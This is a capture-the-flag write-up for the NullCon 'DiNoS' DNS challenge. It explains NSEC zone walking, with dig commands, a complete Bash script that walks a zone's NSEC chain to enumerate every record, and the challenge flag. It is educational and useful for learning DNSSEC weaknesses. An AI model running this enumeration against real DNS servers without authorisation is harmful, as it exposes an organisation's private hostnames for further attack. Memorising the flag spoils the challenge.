# CTF Writeup: DiNoS (NullCon)

**Category:** Network / DNS  
**Author:** @vonDowntown  
**Challenge Description:**  
> Some flag escaped its enclousure. Now it is mixed up with the herd(dinos.nullcon.net). Can you spot it?  
> Verify you can visit the DiNoS: `dig @ip -p 5052 TXT "verify.enodns.nullcon.net"`  

---

## 1. Initial Reconnaissance

The challenge provided an IP address (`52.59.124.14`) and a custom port (`5052`). The description "mixed up with the herd" strongly suggested we needed to list or enumerate records in the `dinos.nullcon.net` zone.

First, I verified connectivity using the provided command:

```bash
dig @52.59.124.14 -p 5052 TXT verify.enodns.nullcon.net
```

Result:

```
"connection_successful_Have_Fun_With_our_DiNoS_Challenge"
```

Confirmed. The server is reachable.

---

## 2. Failed Attempts

My first thought was a standard Zone Transfer (AXFR), which would dump the entire DNS database.

```bash
dig @52.59.124.14 -p 5052 AXFR dinos.nullcon.net
```

Result: Transfer failed.  
The server is configured to reject full zone transfers from unauthorized IPs.

Next, I tried guessing common subdomains (`trex`, `flag`, `admin`), but all returned `NXDOMAIN`.

---

## 3. The Vulnerability: NSEC Walking

I decided to check what DNSSEC records the server might be leaking. I ran an `ANY` query on the root domain to see all available records.

```bash
dig @52.59.124.14 -p 5052 ANY dinos.nullcon.net
```

Result:  
The output included an NSEC record:

```
dinos.nullcon.net. 900 IN NSEC 00nnfwzjt3p8f8jx0aweoxulptivpp9qbw7mckvfw1imqu0u1awdxjuq7jqf.dinos.nullcon.net. NS SOA RRSIG NSEC DNSKEY
```

### The Theory

This confirms the zone is signed with NSEC (not NSEC3). NSEC records are used to prove the non-existence of a domain by linking to the next existing domain in the zone's sorted list.

If we ask for a domain that doesn't exist, the server replies:

> "That doesn't exist. The record before it is A, and the record immediately after it is B."

By chaining these responses, we can "walk" the entire zone (the "herd") from start to finish, effectively dumping the database record by record.

---

## 4. Exploitation

I discovered the first dinosaur in the chain from the initial NSEC record:

```
00nnfwzjt3p8f8jx0aweoxulptivpp9qbw7mckvfw1imqu0u1awdxjuq7jqf
```

I wrote a Bash script to automate the walk:

1. Query the TXT record of the current domain (checking for the flag).
2. Query the NSEC record to find the next domain.
3. Repeat until the flag is found.

### The Script (dino_walk.sh)

```bash
#!/bin/bash

SERVER="52.59.124.14"
PORT="5052"
NEXT="00nnfwzjt3p8f8jx0aweoxulptivpp9qbw7mckvfw1imqu0u1awdxjuq7jqf.dinos.nullcon.net"

echo "[*] Starting the Dinosaur Walk..."

while true; do
    # 1. Check TXT record for flag
    TXT=$(dig @$SERVER -p $PORT TXT "$NEXT" +short)
    
    if [[ ! -z "$TXT" ]]; then
        echo "[TXT] $NEXT -> $TXT"
        if [[ "$TXT" == *"ENO"* ]]; then
            echo -e "\n[!!!] FLAG FOUND: $TXT\n"
            exit 0
        fi
    fi

    # 2. Get next hop via NSEC
    RAW_NSEC=$(dig @$SERVER -p $PORT NSEC "$NEXT" +short)
    NEXT_HOP=$(echo "$RAW_NSEC" | grep -v "^;" | awk '{print $1}' | head -n 1)

    if [[ -z "$NEXT_HOP" ]]; then
        echo "[!] Chain broken."
        exit 1
    fi

    NEXT=$NEXT_HOP
done
```

---

## 5. The Flag

After running the script for a few minutes and traversing ~50 records, the script discovered the flag hidden in the TXT record of:

```
ctyx5ztgyxk6p5x0vngayn7dxvbmhtxjgmobavz3f5qj6jguzk84rt8sldtm.dinos.nullcon.net
```

Flag:

```
ENO{RAAWR_RAAAAWR_You_found_me_hiding_among_some_NSEC_DiNoS}
```

---

## 6. Conclusion

The challenge demonstrated the risk of using NSEC instead of NSEC3 for DNSSEC. NSEC creates a linked list of all valid domains in cleartext, allowing attackers to enumerate the entire zone (Zone Walking) even if Zone Transfers (AXFR) are disabled.
